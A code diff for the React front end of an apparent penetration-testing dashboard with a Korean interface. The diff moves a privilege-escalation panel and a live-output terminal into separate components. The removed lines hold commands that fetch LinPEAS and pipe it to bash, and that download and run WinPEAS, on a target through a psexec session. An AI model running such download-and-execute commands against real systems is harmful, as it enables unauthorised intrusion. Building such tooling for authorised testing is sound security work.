@@ -3,7 +3,6 @@ import {
   type CSSProperties, type PointerEvent as ReactPointerEvent,
 } from "react";
 import { useMutation, useQuery, useQueryClient } from "@tanstack/react-query";
-import InteractiveTerminal from "./InteractiveTerminal";
 import ServiceIntelligencePanel from "./ServiceIntelligencePanel";
 import "./service-intelligence.css";
 import { statusCopy as statusLabel } from "./ui";
@@ -26,6 +25,8 @@ import ManualGuidance from "./ManualGuidance";
 import JobStatus from "./JobStatus";
 import CredentialStoreForm from "./CredentialStoreForm";
 import NetexecOutcome, {type NetexecProtocol} from "./NetexecOutcome";
+import PrivescSessionPanel from "./PrivescSessionPanel";
+import LiveOutputPanel from "./LiveOutputPanel";
 import {
   keepSelectedService,
   parseSmbShares,
@@ -998,62 +999,13 @@ export default function App() {
                 }} />
             </section>
           )}
-          {psexecSession && (
-            <>
-              <section className="privescServer" aria-labelledby="privesc-server-heading">
-                <header>
-                  <h2 id="privesc-server-heading">권한 상승 스크립트 서버 (LinPEAS/WinPEAS)</h2>
-                  <small>{privescServer?.running
-                    ? `tun0에서 서비스 중 · ${privescServer.base_url}`
-                    : "대상이 접근할 수 있도록 tun0에만 임시 파일서버를 엽니다."}</small>
-                </header>
-                <div className="privescServerActions">
-                  <button disabled={privescServerBusy} onClick={togglePrivescServer}>
-                    {privescServerBusy ? "처리 중…"
-                      : privescServer?.running ? "서버 중지" : "서버 시작"}
-                  </button>
-                  <button disabled={!privescServer?.running}
-                    onClick={() => void sendPrivescCommand(
-                      `curl -sS ${privescServer?.base_url}/linpeas/linpeas.sh | bash`)}>
-                    LinPEAS 명령 셸에 입력
-                  </button>
-                  <button disabled={!privescServer?.running}
-                    onClick={() => void sendPrivescCommand(
-                      `curl.exe -o winpeas.exe ${privescServer?.base_url}` +
-                      `/winpeas/winPEASany.exe && .\\winpeas.exe`)}>
-                    WinPEAS 명령 셸에 입력
-                  </button>
-                </div>
-              </section>
-              <InteractiveTerminal sessionId={psexecSession.id}
-                title="impacket-psexec · 검토 후 Enter"
-                initialInput={psexecSession.command}
-                inputRequest={psexecInputRequest}
-                onClose={() => setPsexecSession(undefined)} />
-            </>
-          )}
-          <div className="terminal">
-            <div className={`terminalStatus${focusedRun ? ` terminalStatus--${focusedRun.status}` : ""}`}>
-              <span aria-hidden="true" />
-              <b>실시간 출력</b>
-              <small role="status" aria-live="polite">
-                {!focusedRun
-                  ? "명령 실행 대기"
-                  : `${focusedRun.name} · ${statusLabel[focusedRun.status] ||
-                    (focusedRun.status === "starting" ? "실행 준비 중" : focusedRun.status)} · ${runElapsed}초${
-                    focusedRun.exitCode == null ? "" : ` · 종료 코드 ${focusedRun.exitCode}`
-                  }`}
-              </small>
-            </div>
-            {focusedRun?.message && <p className="terminalError">{focusedRun.message}</p>}
-            {currentOutcome && (
-              <div className={`executionOutcome executionOutcome--${currentOutcome.tone}`}>
-                <b>{currentOutcome.title}</b>
-                <span>{currentOutcome.detail}</span>
-              </div>
-            )}
-            <pre>{output}</pre>
-          </div>
+          <PrivescSessionPanel session={psexecSession} server={privescServer}
+            serverBusy={privescServerBusy} inputRequest={psexecInputRequest}
+            onToggleServer={() => void togglePrivescServer()}
+            onSendCommand={(command) => void sendPrivescCommand(command)}
+            onClose={() => setPsexecSession(undefined)} />
+          <LiveOutputPanel run={focusedRun} elapsed={runElapsed}
+            outcome={currentOutcome} output={output} />
         </section>
         <aside ref={notesRef} className={`notes${notesCollapsed ? " isCollapsed" : ""}`}
           style={{"--workspace-height": `${workspaceHeight}px`} as CSSProperties}>
